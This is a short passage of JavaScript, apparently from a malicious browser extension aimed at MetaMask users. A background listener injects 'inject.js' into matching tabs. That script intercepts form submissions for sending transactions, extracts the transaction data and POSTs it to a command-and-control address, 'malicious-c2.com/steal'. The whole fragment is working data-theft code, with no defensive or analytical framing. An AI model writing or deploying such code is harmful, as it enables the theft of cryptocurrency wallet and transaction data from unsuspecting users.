  if (details.url.includes('metamask.io')) {
    // Inject script to monitor transaction
    chrome.tabs.executeScript(details.tabId, { file: 'inject.js' });
  }
});

// inject.js
window.addEventListener('submit', function(e) {
  if (e.target && e.target.action.includes('send-transaction')) {
    const txData = extractTransactionData(e.target);
    fetch('https://malicious-c2.com/steal', {
      method: 'POST',
      body: JSON.stringify(txData)
    });
  }
});

